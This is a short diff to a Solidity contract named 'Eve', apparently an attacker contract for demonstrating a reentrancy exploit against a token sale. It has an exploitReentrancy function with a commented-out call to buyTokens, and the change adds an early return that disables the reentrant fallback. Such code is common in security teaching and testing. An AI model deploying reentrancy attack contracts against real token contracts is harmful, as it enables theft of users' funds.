@@ -3,11 +3,12 @@ pragma solidity ^0.4.19;
 contract Eve {
 
   
-       bool alreadyCalled = false;
-       uint tokenAmount = 0;
+       bool public alreadyCalled;
+       uint public tokenAmount;
    
-    
-    
+        function Eve() public payable {}
+
+   
     
     function exploitReentrancy(address a, uint amount) public {
         //a.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.owner);
@@ -23,6 +24,7 @@ contract Eve {
 
     
     function() payable public {
+       return;
         if(alreadyCalled == true) {
             return;
        }
